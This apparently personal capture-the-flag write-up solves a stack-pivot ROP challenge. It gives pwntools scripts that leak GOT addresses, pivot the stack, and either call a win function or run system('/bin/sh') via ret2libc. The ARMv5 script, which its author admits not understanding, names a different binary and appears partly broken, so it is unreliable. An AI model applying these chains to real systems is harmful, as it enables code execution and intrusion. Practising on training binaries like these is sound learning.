## x64
---
- partial `RELRO` `ret2lib` challenge
- We're given an address to put our ropchain onto because the initial chain is too small for complex exploitation
- We can perform a stack pivot by changing the value of `rsp` to the address of a buffer that our chain is sitting on
- The main intended solution was to `ret2libpivot`, leaking the address of the function `foothold_function` and then calculating the address of `ret2win`
### intended solution
```python
#!/usr/bin/env python3

from pwn import *

exe = "./pivot"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x00000000004009bb: pop rax; ret;
# 0x00000000004009bd: xchg rsp, rax; ret;
pop_rax = 0x4009BB
xchg_rsp_rax = 0x4009BD

context.log_level = "debug"
# io = gdb.debug(exe, "b pwnme\nc")
io = process(exe)
io.recvuntil(b"place to pivot: ")
place2pivot = int(io.recv(14), 16)
info("place to pivot: %#x", place2pivot)

rop = ROP(exe)
rop.raw(pop_rax)
rop.raw(place2pivot)
rop.raw(xchg_rsp_rax)

offset = 40
stacksmash = flat({offset: rop.chain()})

rop = ROP(exe)
rop.raw(elf.sym.foothold_function)
rop.raw(rop.rdi.address)
rop.raw(elf.got.foothold_function)
rop.raw(elf.sym.puts)
rop.raw(elf.sym.main)

payload = flat(rop.chain())

io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", stacksmash)
io.recvuntil(b"Check out my .got.plt entry to gain a foothold into libpivot\n")
lib_leak = u64(io.recv(6).ljust(8, b"\x00"))
info("lib leak: %#x", lib_leak)

libpivot = ELF("./libpivot.so", checksec=False)
libpivot.address = lib_leak - libpivot.sym.foothold_function
rop = ROP(exe)
rop.raw(libpivot.sym.ret2win)

payload = flat({offset: rop.chain()})

io.sendlineafter(b"Now please send your stack smash\n> ", payload)
io.interactive()
```
### ret2libc solution
```python
#!/usr/bin/env python3

from pwn import *

exe = "./pivot"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

# 0x00000000004009bb: pop rax; ret;
# 0x00000000004009bd: xchg rsp, rax; ret;
pop_rax = 0x4009BB
xchg_rsp_rax = 0x4009BD

context.log_level = "debug"
# io = gdb.debug(exe, "b pwnme\nc")
io = process(exe)
io.recvuntil(b"place to pivot: ")
place2pivot = int(io.recv(14), 16)
info("place to pivot: %#x", place2pivot)

# create stack pivot ROP chain
rop = ROP(exe)
rop.raw(pop_rax)
rop.raw(place2pivot)
rop.raw(xchg_rsp_rax)

offset = 40
stacksmash = flat({offset: rop.chain()})

# create libc leak ROP chain using puts and return to main
rop = ROP(exe)
rop.raw(rop.rdi.address)
rop.raw(elf.got.puts)
rop.raw(elf.sym.puts)
rop.raw(elf.sym.main)

payload = flat(rop.chain())

io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", stacksmash)
io.recvline()
lib_leak = u64(io.recv(6).ljust(8, b"\x00"))
info("lib leak: %#x", lib_leak)

# create system(/bin/sh) ROP chain
libc = ELF("/lib64/libc.so.6", checksec=False)
libc.address = lib_leak - libc.sym.puts
rop = ROP(exe)
rop.raw(rop.rdi.address)
rop.raw(next(libc.search(b"/bin/sh\x00")))
rop.raw(libc.sym.system)

payload = flat({offset: rop.chain()})

io.sendlineafter(b"Now please send your stack smash\n> ", payload)
io.interactive()
```

## ARMv5
---
- Honestly don't understand this much, gl me

```python
#!/usr/bin/env python3

from pwn import *

exe = "./badchars_armv5"
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]

context.log_level = "debug"
io = gdb.debug(exe, "b *pwnme+328\nc")
io.recvuntil(b"pivot: ")
pivot = int(io.recvline().strip(), 16)

payload = b""
payload += p32(pivot)  # pivot addr
payload += p32(elf.sym.foothold_function)
payload += p32(0x0) * 3  # padding
payload += p32(elf.got.foothold_function)
payload += p32(0x0) * 3  # padding
payload += p32(0x105D4)  # pop {r3, pc};
payload += p32(elf.sym.puts)
payload += p32(0x10974)  # mov r0, r7; blx r3; cmp r6, r4; bne #0x964; pop {r4, r5, r6, r7, r8, sb, sl, pc};
payload += p32(0x0) * 7  # padding
payload += p32(0x1076C)  # main()

io.sendlineafter(b"> ", payload)

payload += p32(0x10810)  # pop {fp, pc};
payload += p32(pivot + 0x4)  # fp value
payload += p32(0x1080C)  # sub sp, fp, #4; pop {fp, pc};

offset = 36
payload = flat({offset: payload})
io.sendlineafter(b"> ", payload)
io.recvuntil(b"libpivot\n")
ret2win = u32(io.recvline()[:4]) + 0x18C

payload = flat({offset: ret2win})
io.sendlineafter(b"> ", payload)

io.interactive()
```
